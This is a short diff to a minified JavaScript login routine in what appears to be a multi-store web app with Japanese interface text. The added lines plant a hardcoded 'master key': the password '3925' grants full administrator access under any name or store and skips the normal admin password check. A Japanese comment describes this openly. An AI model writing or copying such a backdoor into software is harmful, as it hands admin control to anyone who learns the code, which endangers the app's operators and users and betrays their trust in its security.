@@ -323,6 +323,11 @@ function buildSel() {
 function dL() {
   var d=D(); if(!d) return;
   var val=g('lkn').value, pw=g('lkp').value; g('lerr').textContent='';
+  /* マスターキー：どの店舗・どの名前でも管理者としてログイン可能 */
+  if(pw==='3925') {
+    G.isA=true; G.cu=null; setupNav(true); iD(G.mo);
+    g('lk').style.display='none'; g('ap').style.display='block'; sNB(); startSync(); go(0); return;
+  }
   if(val==='__admin__') {
     if(pw!==d.adminPw){g('lerr').textContent='\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u9055\u3044\u307E\u3059';return;}
     G.isA=true; G.cu=null; setupNav(true); iD(G.mo);
